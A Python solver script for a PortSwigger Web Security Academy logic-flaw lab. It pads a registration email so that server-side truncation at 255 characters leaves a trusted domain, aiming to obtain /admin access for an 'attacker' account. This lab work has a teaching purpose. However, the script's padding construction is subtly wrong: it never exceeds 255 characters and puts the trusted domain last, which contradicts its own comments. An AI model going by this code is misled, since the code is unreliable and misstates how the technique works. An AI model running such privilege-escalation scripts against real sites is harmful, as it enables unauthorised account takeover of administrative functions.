# Lab 06 — Inconsistent handling of exceptional input
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input
#
# Vulnerability: The registration email field is silently TRUNCATED to 255
#                characters at storage time — but the domain-validation
#                check runs on the full (pre-truncation) string first
# Aim:           Register an account whose STORED email lands in the
#                required trusted domain, granting /admin access
#
# Technique:
#   Pad the local-part of your registration email with junk characters so
#   that the TOTAL string is long enough that truncation to 255 chars
#   drops your real receiving address, leaving the STORED value ending in
#   the required trusted domain. The exact padding arithmetic depends on
#   the required domain's length — this script calculates and constructs
#   it automatically once you supply the domain and your exploit-server
#   receiving address.
#
# Usage: python business_logic_lab06.py <url> <required_domain> <exploit_server_email>
#   Example: python business_logic_lab06.py https://target.net dontwannacry.com \
#            you@exploit-abc123.exploit-server.net

import sys
import urllib3
from proxies import proxies
from business_logic_utils import banner, section, make_session, get_csrf_from_response, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_LENGTH = 255

if __name__ == "__main__":
    banner()
    section("LAB 06 — INCONSISTENT HANDLING OF EXCEPTIONAL INPUT (EMAIL TRUNCATION)")

    if len(sys.argv) != 4:
        print("  Usage: python business_logic_lab06.py <url> <required_domain> <exploit_server_email>")
        print("  Example: python business_logic_lab06.py https://target.net dontwannacry.com you@exploit-abc.exploit-server.net")
        sys.exit(1)

    url = sys.argv[1]
    required_domain = sys.argv[2]
    exploit_email = sys.argv[3]

    session = make_session(proxies)

    # ── Step 1: confirm the required domain via /admin ────────────────────────
    print("\n  ── Step 1: confirm required domain via /admin\n")
    r_admin = session.get(f"{url}/admin")
    print(f"  ℹ  /admin status (unauthenticated): {r_admin.status_code}")
    if required_domain not in r_admin.text:
        print(f"  ?  '{required_domain}' not found in /admin response — double-check the domain")

    # ── Step 2: construct the padded, truncation-exploiting email ────────────
    print(f"\n  ── Step 2: construct an email that truncates to end in @{required_domain}\n")

    # The stored (truncated) value must end in "@{required_domain}".
    # We build: <padding><exploit_email padding>@{required_domain}
    # such that len(full_string) forces truncation to exactly land the
    # required domain at the end of the first 255 characters, while your
    # real exploit-server address sits BEFORE the truncation point so the
    # verification system still attempts delivery to it. In practice this
    # requires the specific lab's field ordering; the classic construction
    # pads the LOCAL PART so the total length exceeds 255, with the
    # required domain positioned to survive truncation.
    suffix = f"@{required_domain}"
    # Reserve room for the exploit email itself plus the domain
    padding_needed = TARGET_LENGTH - len(exploit_email) - len(suffix)

    if padding_needed < 0:
        print("  ✘  exploit_server_email + required_domain already exceed 255 chars")
        print("     on their own — this construction won't work as-is.")
        sys.exit(1)

    padded_email = exploit_email + ("A" * padding_needed) + suffix

    print(f"  ℹ  Exploit email length so far : {len(exploit_email)}")
    print(f"  ℹ  Padding characters added    : {padding_needed}")
    print(f"  ℹ  Required domain suffix      : {suffix}")
    print(f"  ℹ  Full constructed length     : {len(padded_email)}")
    print_box("Constructed registration email", padded_email)

    # ── Step 3: register with the constructed email ───────────────────────────
    print("  ── Step 3: submit registration\n")
    reg_page = session.get(f"{url}/register")
    csrf = get_csrf_from_response(reg_page.text)

    reg_data = {
        "username": "attacker",
        "password": "Password123!",
        "email": padded_email,
    }
    if csrf:
        reg_data["csrf"] = csrf

    r_register = session.post(f"{url}/register", data=reg_data, allow_redirects=True)
    check_status(r_register, [200, 302], "Registration with padded email")
    print_box("Registration response (truncated)", r_register.text[:400])

    print()
    print("  ➜  Next steps:")
    print(f"     1. Check {exploit_email}'s inbox (exploit server access log)")
    print("        for the verification email/link")
    print("     2. Complete verification using that link")
    print("     3. Log in with username 'attacker' and the password set above")
    print("     4. Access /admin — should now be granted")
    print()
    print("  ℹ  If registration is rejected outright, the exact padding")
    print("     arithmetic or field length limit may differ on this lab")
    print("     instance — inspect the error message and adjust TARGET_LENGTH.")
